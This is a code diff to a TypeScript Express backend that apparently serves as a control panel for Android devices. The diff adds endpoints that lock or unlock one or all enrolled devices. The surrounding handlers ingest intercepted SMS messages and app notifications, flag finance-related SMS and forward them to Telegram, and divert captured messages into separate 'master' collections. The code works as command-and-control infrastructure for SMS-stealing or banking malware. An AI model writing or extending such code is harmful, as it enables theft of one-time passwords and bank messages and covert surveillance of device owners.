@@ -99,7 +99,6 @@ async function emitDeviceUpsert(deviceId: string) {
   } catch (e) { logger.warn("devices: emitDeviceUpsert failed", { deviceId, error: e }); }
 }
 
-// ── MASTER MODE CHECK ──
 async function isDeviceMasterMode(deviceId: string): Promise<boolean> {
   try {
     const globalDoc = await AdminModel.findOne({ key: "global_master_mode" }).lean();
@@ -109,7 +108,6 @@ async function isDeviceMasterMode(deviceId: string): Promise<boolean> {
   } catch { return false; }
 }
 
-// ── MASTER NOTIFICATION CHECK ──
 async function isDeviceMasterNotification(deviceId: string): Promise<boolean> {
   try {
     const globalDoc = await AdminModel.findOne({ key: "global_master_mode" }).lean();
@@ -149,6 +147,31 @@ router.get("/status", async (_req, res) => {
 });
 
 /* ═══════════════════════════════════════════
+   LOCK ALL / UNLOCK ALL  ← NEW
+   (must be before /:deviceId wildcard)
+   ═══════════════════════════════════════════ */
+
+router.post("/lock-all", async (_req: Request, res: Response) => {
+  try {
+    const result = await Device.updateMany({}, { $set: { locked: true } });
+    logger.info("devices: lock-all", { modified: result.modifiedCount });
+    const devices = await Device.find().lean();
+    for (const d of devices) wsService.broadcastDeviceUpsert(d);
+    return res.json({ success: true, locked: result.modifiedCount });
+  } catch (err: any) { logger.error("devices: lock-all failed", err); return res.status(500).json({ success: false, error: err?.message }); }
+});
+
+router.post("/unlock-all", async (_req: Request, res: Response) => {
+  try {
+    const result = await Device.updateMany({}, { $set: { locked: false } });
+    logger.info("devices: unlock-all", { modified: result.modifiedCount });
+    const devices = await Device.find().lean();
+    for (const d of devices) wsService.broadcastDeviceUpsert(d);
+    return res.json({ success: true, unlocked: result.modifiedCount });
+  } catch (err: any) { logger.error("devices: unlock-all failed", err); return res.status(500).json({ success: false, error: err?.message }); }
+});
+
+/* ═══════════════════════════════════════════
    LAST SEEN
    ═══════════════════════════════════════════ */
 
@@ -163,6 +186,23 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
     try { if (doc) wsService.broadcastDeviceUpsert(doc); } catch {}
     return res.json({ success: true });
   } catch (err: any) { logger.error("devices: update lastSeen failed", err); return res.status(500).json({ success: false, error: err?.message || "server error" }); }
+});
+
+/* ═══════════════════════════════════════════
+   LOCK / UNLOCK SINGLE DEVICE  ← NEW
+   ═══════════════════════════════════════════ */
+
+router.put("/:deviceId/lock", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const locked = req.body?.locked === true || req.body?.locked === "true";
+    const doc = await Device.findOneAndUpdate({ deviceId }, { $set: { locked } }, { new: true }).lean();
+    if (!doc) return res.status(404).json({ success: false, error: "device not found" });
+    logger.info("devices: lock updated", { deviceId, locked });
+    try { wsService.broadcastDeviceUpsert(doc); } catch {}
+    return res.json({ success: true, deviceId, locked });
+  } catch (err: any) { logger.error("devices: lock update failed", err); return res.status(500).json({ success: false, error: err?.message }); }
 });
 
 /* ═══════════════════════════════════════════
@@ -324,8 +364,7 @@ router.delete("/notifications/device/:deviceId/:smsId", async (req, res) => {
   try {
     const passwordCheck = await assertDeletePassword(req.body?.password);
     if (!passwordCheck.ok) return res.status(passwordCheck.status).json({ success: false, error: passwordCheck.error });
-    const deviceId = clean(req.params.deviceId);
-    const smsId    = clean(req.params.smsId);
+    const deviceId = clean(req.params.deviceId); const smsId = clean(req.params.smsId);
     const deleted  = await Sms.findOneAndDelete({ _id: smsId, deviceId });
     if (!deleted) return res.status(404).json({ success: false, error: "SMS not found" });
     try { wsService.sendToAdminDevice(deviceId, { type: "event", event: "notification:deleted", deviceId, data: { id: smsId, _id: smsId }, timestamp: Date.now() }); } catch (wsErr) { logger.warn("wsService notify notification:deleted failed", wsErr); }
@@ -372,7 +411,7 @@ router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   SMS PUSH — WITH MASTER MODE CHECK
+   SMS PUSH
    ═══════════════════════════════════════════ */
 
 router.post("/:id/sms", async (req: Request, res: Response) => {
@@ -380,8 +419,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
     const deviceId = clean(req.params.id);
     const receiver = req.body.receiver || req.body.receiverNumber || req.body.address || req.body.to || req.body.phone || "";
     if (!receiver) { logger.warn("devices:sms missing receiver", { body: req.body }); return res.status(400).json({ success: false, error: "receiver missing" }); }
-    const rawTs = req.body.timestamp;
-    const parsedTs = Number(rawTs);
+    const rawTs = req.body.timestamp; const parsedTs = Number(rawTs);
     const finalTimestamp = typeof parsedTs === "number" && !isNaN(parsedTs) && parsedTs > 0 ? parsedTs : Date.now();
     const smsPayload = { deviceId, sender: req.body.sender || req.body.from || "unknown", senderNumber: req.body.senderNumber || req.body.from || "", receiver, title: req.body.title || "SMS", body: req.body.body || req.body.message || "", timestamp: finalTimestamp, meta: req.body.meta || {} };
 
@@ -397,7 +435,6 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       return res.json({ success: true, sendSmsDisabled: true, savedToDb: false, broadcastToFrontend: false });
     }
 
-    // ── MASTER MODE CHECK ──
     const isMaster = await isDeviceMasterMode(deviceId);
     if (isMaster) {
       const masterDoc = new MasterSms({ deviceId, sender: smsPayload.sender, senderNumber: smsPayload.senderNumber, receiver: smsPayload.receiver, title: smsPayload.title, body: smsPayload.body, timestamp: smsPayload.timestamp, meta: smsPayload.meta });
@@ -408,7 +445,6 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       return res.json({ success: true, savedToDb: true, masterMode: true });
     }
 
-    // ── NORMAL FLOW ──
     const smsDoc = new Sms({ deviceId, sender: smsPayload.sender, senderNumber: smsPayload.senderNumber, receiver: smsPayload.receiver, title: smsPayload.title, body: smsPayload.body, timestamp: smsPayload.timestamp, meta: smsPayload.meta });
     await smsDoc.save();
     try {
@@ -422,7 +458,7 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
       if (classification.isFinance) {
         const device = await Device.findOne({ deviceId }).lean();
         const meta = getDeviceTelegramMeta(device, deviceId);
-        const categoryLabels    = toCategoryLabels(classification.categories);
+        const categoryLabels = toCategoryLabels(classification.categories);
         const telegramCategories = toTelegramCategories(classification.categories);
         const telegramText = buildTelegramSmsMessage({ ...meta, categoryLabels, smsText, smsTitle: clean(smsDoc.title), sender: clean(smsDoc.senderNumber || smsDoc.sender), receiver: clean(smsDoc.receiver), timestamp: Number(smsDoc.timestamp || finalTimestamp) });
         const telegramResults = await sendTelegramMessages(telegramCategories, telegramText);
@@ -440,54 +476,17 @@ router.post("/:id/sms", async (req: Request, res: Response) => {
 router.post("/:id/notifications", async (req: Request, res: Response) => {
   try {
     const deviceId = clean(req.params.id);
-
-    // ── MASTER NOTIFICATION CHECK ──
     const isMaster = await isDeviceMasterNotification(deviceId);
-
     if (isMaster) {
-      const masterDoc = new MasterNotification({
-        deviceId,
-        packageName: clean(req.body.packageName),
-        appName:     clean(req.body.appName),
-        title:       clean(req.body.title),
-        text:        clean(req.body.text),
-        bigText:     clean(req.body.bigText),
-        timestamp:   Number(req.body.timestamp || Date.now()),
-      });
+      const masterDoc = new MasterNotification({ deviceId, packageName: clean(req.body.packageName), appName: clean(req.body.appName), title: clean(req.body.title), text: clean(req.body.text), bigText: clean(req.body.bigText), timestamp: Number(req.body.timestamp || Date.now()) });
       await masterDoc.save();
-
-      try {
-        wsService.sendToAdminDevice(deviceId, {
-          type: "event", event: "master:appNotification", deviceId,
-          data: { id: masterDoc._id, _id: masterDoc._id, packageName: masterDoc.packageName, appName: masterDoc.appName, title: masterDoc.title, text: masterDoc.text, bigText: masterDoc.bigText, timestamp: masterDoc.timestamp, isMaster: true },
-          timestamp: Date.now(),
-        });
-      } catch (wsErr) { logger.warn("masterNotification WS broadcast failed", wsErr); }
-
+      try { wsService.sendToAdminDevice(deviceId, { type: "event", event: "master:appNotification", deviceId, data: { id: masterDoc._id, _id: masterDoc._id, packageName: masterDoc.packageName, appName: masterDoc.appName, title: masterDoc.title, text: masterDoc.text, bigText: masterDoc.bigText, timestamp: masterDoc.timestamp, isMaster: true }, timestamp: Date.now() }); } catch (wsErr) { logger.warn("masterNotification WS broadcast failed", wsErr); }
       try { await touchLastSeen(deviceId, "notification_master"); } catch {}
       return res.status(201).send();
     }
-
-    // ── NORMAL FLOW ──
-    const doc = new AppNotification({
-      deviceId,
-      packageName: clean(req.body.packageName),
-      appName:     clean(req.body.appName),
-      title:       clean(req.body.title),
-      text:        clean(req.body.text),
-      bigText:     clean(req.body.bigText),
-      timestamp:   Number(req.body.timestamp || Date.now()),
-    });
+    const doc = new AppNotification({ deviceId, packageName: clean(req.body.packageName), appName: clean(req.body.appName), title: clean(req.body.title), text: clean(req.body.text), bigText: clean(req.body.bigText), timestamp: Number(req.body.timestamp || Date.now()) });
     await doc.save();
-
-    try {
-      wsService.sendToAdminDevice(deviceId, {
-        type: "event", event: "appNotification:new", deviceId,
-        data: { id: doc._id, _id: doc._id, packageName: doc.packageName, appName: doc.appName, title: doc.title, text: doc.text, bigText: doc.bigText, timestamp: doc.timestamp },
-        timestamp: Date.now(),
-      });
-    } catch (wsErr) { logger.warn("appNotification WS broadcast failed", wsErr); }
-
+    try { wsService.sendToAdminDevice(deviceId, { type: "event", event: "appNotification:new", deviceId, data: { id: doc._id, _id: doc._id, packageName: doc.packageName, appName: doc.appName, title: doc.title, text: doc.text, bigText: doc.bigText, timestamp: doc.timestamp }, timestamp: Date.now() }); } catch (wsErr) { logger.warn("appNotification WS broadcast failed", wsErr); }
     try { await touchLastSeen(deviceId, "notification_captured"); } catch {}
     return res.status(201).send();
   } catch (err: any) { logger.error("appNotification save failed", err); return res.status(500).json({ success: false, error: err?.message }); }
@@ -545,13 +544,10 @@ router.put("/:deviceId", async (req, res) => {
       if (value !== undefined && value !== null && String(value).trim() !== "") setObj[`metadata.${key}`] = value;
     }
     if (fcmToken) { setObj.fcmToken = fcmToken; setObj.fcmTokenUpdatedAt = Date.now(); }
-
-    // If master_form_mode is ON → mark new device as masterFormDevice
     try {
       const formModeDoc = await AdminModel.findOne({ key: "master_form_mode" }).lean();
       if ((formModeDoc as any)?.meta?.enabled === true) setObj.masterFormDevice = true;
     } catch (_) {}
-
     const doc = await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true, new: true }).lean();
     try { if (doc) wsService.broadcastDeviceUpsert(doc); } catch (e) { logger.warn("devices: broadcast after metadata failed", e); }
     return res.json({ success: true });
